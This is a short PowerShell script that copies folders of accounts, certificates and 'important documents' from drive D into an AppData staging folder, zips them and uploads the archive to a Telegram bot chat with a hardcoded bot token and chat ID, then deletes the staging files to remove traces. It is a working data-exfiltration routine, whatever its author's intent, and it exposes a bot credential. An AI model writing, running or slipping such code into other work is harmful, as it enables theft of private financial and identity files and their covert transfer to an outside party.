New-Item -Path "C:\Users\crism\AppData\Local\send" -ItemType Directory -Force

Copy-Item -Path "D:\CONTAS" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse
Copy-Item -Path "D:\Certificados" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse 
Copy-Item -Path "D:\Documentos Importantes" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse

Compress-Archive -Path "C:\Users\crism\AppData\Local\send" -DestinationPath "C:\Users\crism\AppData\Local\send.zip" -Force

$zipPath = "C:\Users\crism\AppData\Local\send.zip"
$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId  = "5757392163"

$url = "https://api.telegram.org/bot$token/sendDocument"

$boundary = [System.Guid]::NewGuid().ToString()
$lf = "`r`n"


$fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
$fileName = [System.IO.Path]::GetFileName($zipPath)


$bodyHeader = @(
    "--$boundary",
    "Content-Disposition: form-data; name=`"chat_id`"",
    "",
    $chatId,
    "--$boundary",
    "Content-Disposition: form-data; name=`"document`"; filename=`"$fileName`"",
    "Content-Type: application/octet-stream",
    ""
) -join $lf


$bodyFooter = "$lf--$boundary--$lf"

$body = [System.Text.Encoding]::UTF8.GetBytes($bodyHeader) + $fileBytes + [System.Text.Encoding]::UTF8.GetBytes($bodyFooter)


Invoke-WebRequest -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body

Remove-Item "C:\Users\crism\AppData\Local\send" -Recurse -Force
Remove-Item "C:\Users\crism\AppData\Local\send.zip" -Force
exit